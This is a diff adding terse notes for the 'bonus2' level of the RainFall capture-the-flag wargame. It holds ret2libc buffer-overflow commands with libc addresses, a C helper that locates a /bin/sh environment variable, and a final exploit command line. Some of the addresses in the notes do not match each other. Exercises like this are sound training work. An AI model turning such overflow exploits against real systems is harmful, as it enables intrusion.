@@ -1,0 +1,25 @@
+##  Description
+
+LANG=fi ./bonus2 $(python -c "print 'A'*53 + 'BBBB' + adresse_system") $(python -c "print 'CCCC' + adresse_bin_sh")
+
+0xb7e6b060
+system()
+
+bonus2@RainFall:~$ python -c "print hex(0xb7e00000 + 1444952)"
+0xb7f60c58L
+/bin/sh
+
+LANG=fi ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'A'*14 + '\x60\xb0\xe6\xb7' + 'CCCC' + '\x58\xcc\xf8\xb7'")
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    printf("%p\n", getenv("BINSH"));
+    return 0;
+}
+
+Final:
+
+LANG=fi ./bonus2 $(python -c "print 'A'*40") $(python -c "print 'A'*18 + '\x60\xb0\xe6\xb7' + 'CCCC' + '\x58\xcc\xf8\xb7'")
